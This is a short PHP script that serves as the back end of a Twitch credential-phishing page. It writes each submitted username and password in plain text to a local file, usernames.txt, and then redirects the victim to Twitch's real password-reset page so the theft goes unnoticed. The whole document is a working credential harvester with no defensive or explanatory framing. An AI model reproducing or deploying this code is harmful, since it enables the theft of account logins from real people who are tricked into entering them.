<?php

file_put_contents("usernames.txt", "Username: " . $_POST['twitch_user'] . " Pass: " . $_POST['twitch_pass'] . "\n", FILE_APPEND);
header('Location: https://passport.twitch.tv/password_resets/new?');
exit();
